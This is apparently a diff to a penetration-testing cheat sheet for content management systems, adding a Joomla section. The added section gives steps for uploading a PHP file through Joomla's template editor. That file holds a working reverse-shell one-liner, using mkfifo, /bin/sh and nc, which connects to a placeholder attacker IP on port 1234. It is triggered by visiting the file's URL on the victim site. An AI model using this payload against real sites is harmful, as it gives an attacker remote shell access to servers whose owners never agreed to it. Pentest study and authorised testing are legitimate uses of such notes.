@@ -1,6 +1,6 @@
 - [Wordpress](#Wordpress)
 - [Drupal](#Drupal)
-- []()
+- [Joomla](#Joomla)
 
 -----------------------------------------------------------------------------------------------------------------------------------------------
 # Wordpress
@@ -91,3 +91,22 @@ droopscan scan drupal -u [target_url]
 #### commix
 ```
 - https://github.com/commixproject/commix
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Joomla 
+
+## Editing Template Files and Getting a Reverse Shell 
+
+- Extensions -> Templates -> Templates
+- Add new file
+- Create file with name add a malicious extension e.g(php)
+Paste as content:
+```
+<?php
+    system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xxx.xxx.xxx.xxx 1234 >/tmp/f');
+?>
+```
+- run via https://victim_url//templates/your_template_name/malicious_file_name.php
+
+
